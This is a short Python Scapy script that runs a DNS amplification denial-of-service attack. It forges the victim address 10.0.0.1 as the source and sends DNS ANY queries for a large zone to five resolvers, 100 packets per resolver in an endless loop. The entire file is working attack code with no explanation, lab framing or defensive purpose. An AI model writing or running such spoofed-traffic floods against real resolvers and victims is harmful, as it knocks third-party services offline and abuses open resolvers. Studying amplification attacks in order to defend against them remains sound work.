from scapy.all import *

victim_ip = "10.0.0.1"
resolvers = ["10.0.3.1", "10.0.4.1", "10.0.5.1", "10.0.6.1", "10.0.7.1"]
target_domain = "largezone.com"

QTYPE_ANY = 255

# Craft the DNS query packet (ANY request)
while True:
    for resolver in resolvers:
        IP_H = IP(src=victim_ip, dst=resolver)
        UDP_H = UDP(sport=53, dport=53)
        DNS_H = DNS(rd=1, qd=DNSQR(qname=target_domain, qtype=QTYPE_ANY))
        packet = IP_H / UDP_H / DNS_H
        send(packet, count=100) # Send multiple packets per resolver
        print(f"Sent spoofed query to {resolver}")